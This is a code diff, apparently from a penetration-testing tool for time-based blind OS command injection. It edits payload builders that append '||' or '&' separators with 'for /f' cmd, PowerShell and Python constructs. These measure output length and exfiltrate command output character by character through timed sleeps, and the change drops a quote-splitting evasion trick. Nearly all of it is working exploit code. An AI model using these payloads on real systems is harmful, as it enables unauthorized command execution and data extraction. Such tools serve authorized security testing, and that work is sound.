@@ -28,7 +28,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator + 
-                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
+                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                  "do if %i==" +str(output_length) + " "
                  "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                 )
@@ -37,7 +37,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +  
-                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
+                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                  "do if %i==" +str(output_length) + " "
                  "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                 )
@@ -103,7 +103,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print len(\'" + TAG + "\')\""
     if separator == "||" :
       payload = (separator +  " " 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(output_length) + " "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -114,7 +114,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(output_length) + " "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -181,7 +181,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(output_length) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
@@ -191,7 +191,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(output_length) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
@@ -256,7 +256,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(output_length) + " " +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -266,7 +266,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(output_length) + " " +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -332,7 +332,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " +
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
                 " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                 )
@@ -341,7 +341,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
                 " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                 )
@@ -417,7 +417,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "])\""
     if separator == "||" :
       payload = (separator +  " " 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
+                "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" +str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -428,7 +428,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +  
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
+                "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" +str(ascii_char) + " "
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
@@ -492,7 +492,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(ascii_char)+
                 " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
@@ -502,7 +502,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(ascii_char)+
                 " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
@@ -559,7 +559,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(ascii_char) + " " +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
@@ -570,7 +570,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(ascii_char) + " " +
                 "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
